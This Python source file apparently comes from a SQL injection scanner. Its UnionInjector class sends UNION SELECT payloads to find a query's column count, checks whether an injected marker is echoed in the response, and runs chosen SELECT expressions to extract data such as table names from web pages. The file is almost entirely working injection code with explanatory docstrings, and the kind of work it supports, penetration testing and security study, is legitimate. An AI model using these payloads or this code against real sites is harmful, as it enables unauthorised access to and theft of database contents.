from core.Analyzer import Analyzer
from core.Requester import Requester
from utils.constants import DIFF_MARKER, DIFFER_LENGTH_COL_COUNT, InjectionContext


class UnionInjector:
    """
    A UNION query combines the results of two SELECT statements.

    For example, if the application does:

            SELECT first_name, last_name
            FROM users
            WHERE id = <input>;

    UNION SQLi appends another SELECT to return additional rows or values.


    Notes:
    -----

    `'`: closes the string
    Ex.: SELECT * FROM users WHERE id = '$id';
            => SELECT * FROM users WHERE id = '' UNION SELECT...;

    UNION SELECT ... is appended to original query

    `--`: comments out the trailing `'` (the second one in `'$id'`)
    """

    def __init__(self, requester: Requester, analyzer: Analyzer):
        self.requester = requester
        self.analyzer = analyzer

    def find_column_count(
        self, param: str, ctx: InjectionContext
    ) -> int | None:
        """Find the number of columns expected by the SQL query."""

        # Get a baseline to which we will compare the other response bodies
        baseline = self.requester.send({param: ctx.prefix + ctx.suffix})

        # Logger.debug(f"query: {ctx.prefix + ctx.suffix}, Baseline response: {baseline.body}")

        """
		Try UNION SELECT statements with an increasing number of NULL values.

		As long as the number of selected columns does not match the original
		query, the database typically returns an SQL error.

		When a payload no longer triggers an SQL error and the response still
		looks like a valid application page, we have found the expected number
		of columns.
		"""
        for count in range(1, 20):
            # Create a NULL list matching the number of columns to test compatibility
            nulls = ",".join(["NULL"] * count)

            payload = f"{ctx.prefix}UNION SELECT {nulls}{ctx.suffix}"
            # Logger.debug(payload)

            response = self.requester.send({param: payload})

            if not self.analyzer.has_sql_error(
                response
            ) and not self.analyzer.responses_differ(
                baseline,
                response,
                DIFFER_LENGTH_COL_COUNT,
            ):
                # Logger.debug(response.body)
                return count

        return None

    def test_marker(
        self, param: str, ctx: InjectionContext, column_count
    ) -> bool:
        """
        Check if the marker we inject in the SQL query is printed back
        in the response body. This would prove that the table names used in
        the query are leaked in the HTML.
        """

        # Create a marker list matching the number of columns to make query compatible.
        nulls = ",".join([DIFF_MARKER] * (column_count))

        payload = f"{ctx.prefix}UNION SELECT {nulls}{ctx.suffix}"
        # Logger.debug(payload)

        response = self.requester.send({param: payload})

        # Logger.debug(response.body)
        return DIFF_MARKER in response.body

    def test_expressions_name(
        self,
        param: str,
        ctx: InjectionContext,
        expression: str,
        column_count: int,
    ) -> str | None:
        """
        Now that we know the injection works we will get the real table names
        """

        # Add SELECT keyword if not included in the expression
        expression = (
            expression if expression.find("SELECT") != -1 else "SELECT " + expression
        )
        # Logger.debug(f"expression: {expression}")
        payload = f"{ctx.prefix}UNION {expression}{ctx.suffix}"

        response = self.requester.send({param: payload})

        # Logger.debug(response.body)
        return self._extract_text(response.body)

    def _extract_text(self, body: str) -> str:
        """
        Very simple extractor:
        keeps only useful lines.
        """
        lines = body.split("\n")

        cleaned = [line.strip() for line in lines if line.strip()]

        return "\n".join(cleaned)
